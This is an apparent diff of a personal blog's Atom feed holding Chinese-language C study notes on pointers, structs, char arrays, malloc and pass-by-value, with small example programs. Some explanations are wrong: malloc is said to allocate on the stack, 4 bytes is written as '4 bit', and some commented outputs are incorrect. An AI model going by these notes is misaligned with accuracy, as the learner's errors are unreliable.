+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+
+// 聲明一個結構體
+struct Person
+{
+   char name[20];
+   int age;
+};
+
+// 結構體指針
+int main()
+{
+    struct Person per1 = {.name=&amp;quot;Tom&amp;quot;, .age=12};
+    struct Person *per_ptr = &amp;amp;per1;
+
+    // 兩者等價
+    (*per_ptr).age = 20;
+    per_ptr-&amp;gt;age = 30;
+
+    printf(&amp;quot;name: %s&#92;n&amp;quot;, (*per_ptr).name);
+    printf(&amp;quot;age: %d&#92;n&amp;quot;, (*per_ptr).age);
+    
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數使用/" >
+        </entry>
+        <entry>
+            <title>
+                結構體指針傳遞練習題 1
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針傳遞練習題 1/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+/*結構體傳參*/
+// 聲明一個結構體
+struct Dog
+{
+   char name[20];
+   int age;
+   double weight;
+};
+
+// 只能在這邊聲明返回指針
+// 陣列在表達式中會自動轉換為指針
+char *say(struct Dog dog){
+    static char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀
+    sprintf(info, &amp;quot;Name: %s, Age: %d, Weight: %.2lf&amp;quot;, dog.name, dog.age, dog.weight);
+    return info; //實際是返回陣列的[0] 位置的指針
+}
+
+// 方式 2, 指針傳遞
+char *say1(struct Dog *dog_ptr){
+    static char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀
+    (*dog_ptr).age = (*dog_ptr).age + 1;
+    sprintf(info, &amp;quot;Name: %s, Age: %d, Weight: %.2lf&amp;quot;, (*dog_ptr).name, (*dog_ptr).age, (*dog_ptr).weight);
+    return info; //實際是返回陣列的[0] 位置的指針
+}
+
+// 結構體指針
+int main()
+{
+    // 聲明結構體變量，並初始化
+    struct Dog myDog;
+    strcpy(myDog.name, &amp;quot;大黃&amp;quot;);
+    myDog.age = 2;
+    myDog.weight = 2.3;
+
+    char *result = say(myDog);
+    printf(&amp;quot;info=%s&#92;n&amp;quot;, result);
+
+    char *result2 = say1(&amp;amp;myDog);
+    printf(&amp;quot;info=%s&#92;n&amp;quot;, result2);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針傳遞練習題 1/" >
+        </entry>
+        <entry>
+            <title>
+                數組反轉操作
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/數組反轉操作/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+
+int main()
+{
+    // 一維數組反轉操作
+    int arr[] = {0,1,2,3,4,5,6,7,8,9};   
+    size_t LENGTH = sizeof(arr) / sizeof(int);
+    int tmp = 0;
+    // for (int i=0; i &amp;lt; (LENGTH/2); i++)
+    // {
+    //     tmp = arr[i];
+    //     arr[i] = arr[LENGTH-1-i];
+    //     arr[LENGTH-1-i] = tmp;
+    // }
+    
+    // 反轉實現方式 2
+    for (int left = 0, right = LENGTH-1;left &amp;lt; right;left++, right--)
+    {
+        int tmp = arr[left];
+        arr[left] = arr[right];
+        arr[right] = tmp;
+    }
+    for (int i=0; i &amp;lt; LENGTH; i++)
+    {
+        printf(&amp;quot;--%d&#92;n&amp;quot;, arr[i]);
+    }
+    
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/數組反轉操作/" >
+        </entry>
+        <entry>
+            <title>
+                指針的自增自減運算
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/指針的自增自減運算/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int arr[5] = {1, 2, 3, 4, 5};
+
+    // 以下兩種寫法相等
+    // int *p = arr; // 取 arr 首地址存入 pointer p
+    int *p = &amp;amp;arr[0]; // &amp;amp; 取地址，並賦值到 *p
+    p++; // 使 p 指向下一個元素
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
+    return  0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818171509.png&quot; alt=&quot;Pasted image 20250818171509.png&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818171526.png&quot; alt=&quot;Pasted image 20250818171526.png&quot; /&gt;&lt;br /&gt;
+運算子結合是由右往左結合&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int arr[5] = {1, 3, 5, 7, 9};
+
+    // 以下兩種寫法相等
+    // int *p = arr; // 取 arr 首地址存入 pointer p
+    int *p = &amp;amp;arr[0]; // &amp;amp; 取地址，並賦值到 *p -&amp;gt; 1
+    p++; // 使 p 指向下一個元素 -&amp;gt; 3
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p); // 3
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p++); //取值後輸出，並往後移動 4 個 bit -&amp;gt; 3
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p); // 重新取用一次 p 的值 -&amp;gt; 5
+    // *++p 運算子是由右往左結合，故等同於 *(++p)
+    // ++p 為 7，*++p = 取 p 值 = 7
+    printf(&amp;quot;%d&#92;n&amp;quot;, *++p); // 再移動指針增加 4 bit, 並取值 p -&amp;gt; 7
+    // ++*p = ++(*p) 取 *p 值並 +1(由右往左結合)
+    printf(&amp;quot;%d&#92;n&amp;quot;, ++*p); // 取指針 p 的值(7)，並將該值 + 1 -&amp;gt; 8
+
+    return  0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/指針的自增自減運算/" >
+        </entry>
+        <entry>
+            <title>
+                字符數組
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/字符數組/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+
+int main()
+{
+    /*
+        C 語言裡面沒有 string 的型別，需要以 char array 的方式實現
+        所有字符數組必須以 &#92;0 作為結尾
+        且字符串末尾的 &#92;0 會佔一個 bytes，計算 length 需注意 n(字符串數量) + 1 
+    */
+    //字符數組必須以 &#92;0 作為結尾
+    char arr[] = {&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;&#92;0&#39;};
+
+    // 標準寫法
+    char str1[] = {&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39;w&#39;, &#39;&#92;0&#39;};
+    
+    // 簡化 
+    // length = string 數量(11) + &#39;&#92;0&#39;(1) 的數量共 12 個
+    char str2[12] = {&amp;quot;hello world&amp;quot;}; // 注意使用雙引號，非單引號
+
+    // 進一步簡化
+    char str3[] = {&amp;quot;hello world&amp;quot;};
+    char str4[] = &amp;quot;hello world&amp;quot;;
+
+    size_t str_size = sizeof(str4) / sizeof(char);
+    printf(&amp;quot;%d&#92;n&amp;quot;, str_size); // 字符串長度 12
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250826080229.png&quot; alt=&quot;Pasted image 20250826080229.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;區分: &#39;&#92;0&#39;, 0, &#39;0&#39;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+
+int main()
+{
+    // 區分: &#39;&#92;0&#39;, 0, &#39;0&#39;
+    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;&#92;0&#39; == 0); // true
+    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;0&#39; == &#39;&#92;0&#39;); // false
+    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;0&#39; == 0); // false
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;單雙引號區別&lt;br /&gt;
+如果用 &amp;quot;x&amp;quot; 宣告字符串變數，C 語言就會自動補 &lt;code&gt;&#92;0&lt;/code&gt;&lt;br /&gt;
+如果用 &#39;x&#39; 宣告字符串變數，C 語言不會自動補 &lt;code&gt;&#92;0&lt;/code&gt;，但用 &#39;x&#39; 宣告的字符串可以進行&lt;code&gt;ASCII&lt;/code&gt;加減法&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+
+int main()
+{
+    char char1[] = &amp;quot;x&amp;quot;; // 常量，會自動補 &#92;0 結束符
+    char char2[] = {&#39;x&#39;}; // 字符，必須手動補 &#92;0 結束符
+    // &amp;quot;x&amp;quot; 與 &#39;x&#39; 字節佔用量
+    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 &#92;0
+    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 &#92;0
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;char 字符 ASCII 運算&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+
+int main()
+{
+    char char1[] = &amp;quot;x&amp;quot;; // 常量，會自動補 &#92;0 結束符
+    char char2[] = {&#39;x&#39;}; // 字符，必須手動補 &#92;0 結束符
+    // &amp;quot;x&amp;quot; 與 &#39;x&#39; 字節佔用量
+    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 &#92;0
+    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 &#92;0
+
+    // %c 用於輸出一個 char 字符
+    printf(&amp;quot;%c&#92;n&amp;quot;, &#39;x&#39;+1); // char 運算，+1 後會變成 y
+    printf(&amp;quot;%c&#92;n&amp;quot;, 65); // 輸出 A, 因為(ASCII 65 = &#39;A&#39;)
+    printf(&amp;quot;%c&#92;n&amp;quot;, &#39;A&#39;+1); // 輸出 B, 因為(ASCII 65 = &#39;A&#39;)+1 = (ASCII 66 = &#39;B&#39;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/字符數組/" >
+        </entry>
+        <entry>
+            <title>
+                同類指針相減運算
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/同類指針相減運算/</id>
+            <content type="html">
+                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818180158.png&quot; alt=&quot;Pasted image 20250818180158.png&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int arr[5] = {1, 3, 5, 7, 9};
+
+    // 使用 &amp;amp; 運算符，提取 arr[0] 的地址存入指針變數 p1
+    int *p1 = &amp;amp;arr[0];
+    int *p2 = &amp;amp;arr[3];
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p1); // 1
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p2); // 7
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p2-*p1); // 用 * 運算符取 p2、p1 指針值做相減(7-1=6)
+    printf(&amp;quot;%d&#92;n&amp;quot;, p1); // 指針相減 p2-p1 相差 14
+    printf(&amp;quot;%d&#92;n&amp;quot;, p2); // 指針相減 p2-p1 相差 14
+    printf(&amp;quot;%d&#92;n&amp;quot;, p2 - p1); // 指針相減 p2-p1 相差 12 個 byte (1807002288-1807002300 = 12)/4bit(int 長度) = 3 個元素的距離
+    return  0;
+}
+
+// execute: clang PointerTest-2.3.3.c -o PointerTest-2.3.3 &amp;amp;&amp;amp; ./PointerTest-2.3.3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; 與 &lt;code&gt;*&lt;/code&gt; 差異&lt;br /&gt;
+&lt;code&gt;&amp;amp;&lt;/code&gt; -&amp;gt; 從「變數」取址運算符&lt;br /&gt;
+&lt;code&gt;*&lt;/code&gt; -&amp;gt; 從「指針」取值運算符&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818181835.png&quot; alt=&quot;Pasted image 20250818181835.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;AB 兩個選想是因為 scanf 需要以 &amp;amp; 作為賦值&lt;/p&gt;
+&lt;h1 id=&quot;賦值練習題&quot; tabindex=&quot;-1&quot;&gt;賦值練習題&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818185836.png&quot; alt=&quot;Pasted image 20250818185836.png&quot; /&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/同類指針相減運算/" >
+        </entry>
+        <entry>
+            <title>
+                二級指針(多重指針)
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/二級指針(多重指針)/</id>
+            <content type="html">
+                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819212809.png&quot; alt=&quot;Pasted image 20250819212809.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;例題 1:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int num = 10;
+    int *p1 = &amp;amp;num; // p1 指向 num 的地址
+    int *p2 = p1;   // p2 也指向 num 的地址（與 p1 相同）
+    printf(&amp;quot;%p&#92;n&amp;quot;, p1); // 輸出 p1（num 的地址）
+    printf(&amp;quot;%p&#92;n&amp;quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）
+
+    // 故，p2 不是二級指針，因為他還是指向 p1 的 num 地址
+
+    // 記憶體示意圖
+    // 記憶體地址    變數      值
+    // 0x1000       num      10
+    // 0x2000       p1       0x1000  (num的地址)
+    // 0x3000       p2       0x1000  (複製p1的值，也是num的地址)
+    return 0;
+}
+
+// execute: 
+//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;例題 2:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二重指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int num = 10;
+    int *p1 = &amp;amp;num; // p1 指向 num 的地址
+    int *p2 = p1;   // p2 也指向 num 的地址（與 p1 相同）
+    printf(&amp;quot;%p&#92;n&amp;quot;, p1); // 輸出 p1（num 的地址）
+    printf(&amp;quot;%p&#92;n&amp;quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）
+    *p2 = 100; // 將 p2 所在的位址的值改為 100
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p2); // 100
+    printf(&amp;quot;num: %d&#92;n&amp;quot;, num); // 因為 p2 取的是 num 的位址，當 *p2 賦值時，其實是修改 num 所在記憶體空間的值
+    return 0;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二級指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int a = 10;
+    int *p3 = &amp;amp;a;
+
+    // 如何聲明二級指針
+    // 但是此時 p4 定義的二級指針寫法錯誤
+    int *p4 = &amp;amp;p3;
+    printf(&amp;quot;%p&#92;n&amp;quot;, p3); // 0x16b74aadc
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p3); // 0x16b74aad0
+    printf(&amp;quot;%p&#92;n&amp;quot;, p4); // 0x16b74aad0
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p4); // 0x16f05eac8(p4 的地址)
+
+    // 正確的定義二級指針語法
+    int **p5 = &amp;amp;p3;
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p5); // 1868049116
+    printf(&amp;quot;%d&#92;n&amp;quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)
+
+    **p5 = 100;
+    printf(&amp;quot;%d&#92;n&amp;quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)
+    printf(&amp;quot;%d&#92;n&amp;quot;, a); // 10(正確，**p5 = p3 指針所指向的 a 的值)
+}
+
+// execute: 
+//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;二級指針只能由指針賦值，不能直接拿地址賦值&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 舉例 1:
+int b = 5;
+int **p1 = &amp;amp;b; // 這裡出錯，因為 b 是 int 類型，就算 &amp;amp;b 也是取 int 的地址，但 **p1 是二級指針
+
+// 正確
+int b = 5;
+int *pp0 = &amp;amp;b; // 需要經過一個轉換，轉換成指針形態才能賦值給二級指針
+int **p1 = &amp;amp;pp0;
+printf(&amp;quot;%d&#92;n&amp;quot;, **p1); 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819225732.png&quot; alt=&quot;Pasted image 20250819225732.png&quot; /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;多級指針解引用&quot; tabindex=&quot;-1&quot;&gt;多級指針解引用&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819230308.png&quot; alt=&quot;Pasted image 20250819230308.png&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二級指針 -&amp;gt; 多級指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int var = 5;
+    int *ptr = &amp;amp;var;
+    printf(&amp;quot;%d&#92;n&amp;quot;, *ptr);
+    int **pptr = &amp;amp;ptr; // 二級指針
+    printf(&amp;quot;%d&#92;n&amp;quot;, **pptr);
+    int ***ppptr = &amp;amp;pptr; // 三級指針
+    printf(&amp;quot;%d&#92;n&amp;quot;, ***ppptr); // 三級指針解引用
+
+    ***ppptr = 100; // 其實修改的是 var 的變數值
+    // 所有引用這個地址的值都被修改了
+    printf(&amp;quot;%d&#92;n&amp;quot;, *ptr); 
+    printf(&amp;quot;%d&#92;n&amp;quot;, **pptr);
+    printf(&amp;quot;%d&#92;n&amp;quot;, ***ppptr);
+    
+}
+
+// execute: 
+//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819231450.png&quot; alt=&quot;Pasted image 20250819231450.png&quot; /&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/二級指針(多重指針)/" >
+        </entry>
+        <entry>
+            <title>
+                malloc 內存分配
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配/</id>
+            <content type="html">
+                &lt;p&gt;malloc&lt;br /&gt;
+函數原型&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void *malloc(unsigned int size); // size 類型為無符號整型
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;無符號整型 = 0 or 正整數&lt;/p&gt;
+&lt;p&gt;因為少了負數，可以將所有位元用於顯示正整數&lt;/p&gt;
+&lt;p&gt;malloc 函數返回的是一個指針，所以他是一個指針函數&lt;/p&gt;
+&lt;p&gt;作用: 在內存的動態儲存區(stack 區) 中分配一個長度為 size 的連續空間，並將該空間的首地址做為函數值返回，即此函數為&lt;mark&gt;指針函數&lt;/mark&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配/" >
+        </entry>
+        <entry>
+            <title>
+                malloc 內存分配 - void 指針
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配 - void 指針/</id>
+            <content type="html">
+                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830184511.png&quot; alt=&quot;Pasted image 20250830184511.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830190855.png&quot; alt=&quot;Pasted image 20250830190855.png&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;
+
+// 無類型指針
+
+// 結構體指針
+int main()
+{
+    int x = 10;
+    int *p = &amp;amp;x;
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
+
+    
+    // 無類型的指針變數可以與其他類型的指針相賦值
+    void *q = &amp;amp;x; // 無類型指針
+    q = p;
+    int *r = q;
+    double *s = q;
+    
+    // int y = *q; // 無法解讀 void 指針類型的數據
+    int y = *((int *)q); // 強制轉型
+    printf(&amp;quot;%d&#92;n&amp;quot;, *r);
+    printf(&amp;quot;%d&#92;n&amp;quot;, y);
+    printf(&amp;quot;%f&#92;n&amp;quot;, *s); // 不要嘗試讀取其他類型的指針，會導致不可預期的行為
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配 - void 指針/" >
+        </entry>
+        <entry>
+            <title>
+                C 語言 pass by value
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/C 語言 pass by value/</id>
+            <content type="html">
+                &lt;p&gt;C 語言沒有 pass by reference, 只有 pass by value，這是語言特性&lt;/p&gt;
+&lt;p&gt;就算是 pointer 也是 pass by value&lt;/p&gt;
+&lt;p&gt;若要實現 pass by reference, 需借助指針的功能&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;
+
+void setNum(int *p)
+{
+    *p = 10; // 解引用後修改其值
+}
+int main()
+{
+    int a=100;
+    printf(&amp;quot;a: %d&#92;n&amp;quot;, a); // 100
+    setNum(&amp;amp;a); // 將 a 的地址傳進 function
+    printf(&amp;quot;a: %d&#92;n&amp;quot;, a); // 10
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/C 語言 pass by value/" >
         </entry>
 </feed>
